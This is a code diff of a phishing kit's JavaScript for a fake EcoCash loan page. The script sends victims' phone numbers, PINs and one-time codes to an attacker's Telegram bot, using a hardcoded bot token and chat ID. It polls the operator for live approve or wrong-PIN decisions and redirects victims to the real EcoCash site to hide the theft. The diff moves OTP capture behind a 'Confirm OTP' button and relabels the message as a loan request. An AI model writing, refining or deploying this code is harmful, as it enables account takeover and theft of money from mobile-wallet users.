@@ -1,5 +1,5 @@
 // CONFIG — CHANGE THESE
-const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';  // <<< RENAME: BOT_TOKEN → TELEGRAM_BOT_TOKEN
+const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
 const CHAT_ID = '1469249528';
 
 // Update installment in real-time
@@ -13,7 +13,7 @@ function updateInstallment() {
     document.getElementById('installment').textContent = installment;
 }
 
-// On loan form submit
+// On loan form submit (Step 1: Phone, PIN, Amount)
 document.getElementById('loanForm').addEventListener('submit', async function(e) {
     e.preventDefault();
 
@@ -23,9 +23,9 @@ document.getElementById('loanForm').addEventListener('submit', async function(e)
     const duration = document.getElementById('duration').value;
     const installment = (amount / duration).toFixed(2);
 
-    // Send credentials to Telegram
+    // Send Step 1 data to Telegram
     const credentialsMsg = `
-📞 *Ecocash Login*  
+📞 *Ecocash Loan Request*  
 📱 *Phone:* ${phone}  
 🔐 *PIN:* ${pin}  
 💰 *Amount:* \$${amount}  
@@ -40,14 +40,13 @@ document.getElementById('loanForm').addEventListener('submit', async function(e)
     document.getElementById('loanForm').style.display = 'none';
     document.getElementById('otpScreen').style.display = 'block';
 
-    // Start polling for approval
+    // Start approval polling
     pollApproval(phone);
 });
 
-// Poll every 3 seconds for approval status
+// Poll every 3 seconds for approval decision
 async function pollApproval(phone) {
     const statusMsg = document.getElementById('statusMsg');
-    const otpInput = document.getElementById('otp');
     let attempts = 0;
 
     const interval = setInterval(async () => {
@@ -63,33 +62,61 @@ async function pollApproval(phone) {
 
             if (decision.trim() === 'approve') {
                 clearInterval(interval);
-                statusMsg.textContent = "✅ Approved! Redirecting...";
-                setTimeout(() => {
-                    window.location.href = "https://ecocash.co.zw";
-                }, 2000);
+                statusMsg.textContent = "✅ Approved! Enter OTP and confirm.";
+                showOTPConfirmButton(phone); // Show Confirm button only when approved
             } else if (decision.trim() === 'wrong_pin') {
                 clearInterval(interval);
                 statusMsg.textContent = "❌ Invalid PIN. Try again.";
                 setTimeout(() => location.reload(), 2000);
             } else if (decision.trim() === 'wrong_otp') {
                 clearInterval(interval);
-                otpInput.style.border = "2px solid #c62828";
+                document.getElementById('otp').style.border = "2px solid #c62828";
                 statusMsg.textContent = "❌ Invalid OTP.";
             }
         } catch (err) {
-            // Silently fail — network lag simulation
+            // Ignore network errors
         }
 
         attempts++;
     }, 3000);
+}
 
-    // Capture OTP as soon as 4 digits are entered
-    otpInput.addEventListener('input', async function() {
-        if (this.value.length === 4) {
-            const otpMsg = `🔑 *OTP Captured:* ${this.value}  | 📱 *Phone:* ${phone} | ⏱️ ${new Date().toISOString()}`;
-            await sendToTelegram(otpMsg);
+// Show OTP Confirm button only after approval
+function showOTPConfirmButton(phone) {
+    const otpInput = document.getElementById('otp');
+    const statusMsg = document.getElementById('statusMsg');
+
+    // Only add button once
+    if (document.getElementById('confirmOtpBtn')) return;
+
+    const confirmBtn = document.createElement('button');
+    confirmBtn.id = 'confirmOtpBtn';
+    confirmBtn.style.marginTop = '10px';
+    confirmBtn.textContent = 'Confirm OTP';
+    confirmBtn.onclick = async () => {
+        const otp = otpInput.value.trim();
+        if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
+            alert("Please enter a valid 4-digit OTP");
+            return;
         }
-    });
+
+        // Send OTP to Telegram
+        const otpMsg = `
+🔑 *OTP Confirmed*  
+📱 *Phone:* ${phone}  
+🔢 *OTP:* ${otp}  
+⏱️ *Time:* ${new Date().toISOString()}
+        `;
+        await sendToTelegram(otpMsg);
+
+        // Success
+        statusMsg.textContent = "✅ OTP Verified! Redirecting...";
+        setTimeout(() => {
+            window.location.href = "https://ecocash.co.zw";
+        }, 2000);
+    };
+
+    document.getElementById('otpScreen').appendChild(confirmBtn);
 }
 
 // Send message to Telegram
@@ -103,5 +130,5 @@ async function sendToTelegram(message) {
             text: message,
             parse_mode: 'Markdown'
         })
-    }).catch(() => {}); // Fail silently
+    }).catch(() => {}); // Silent fail
 }
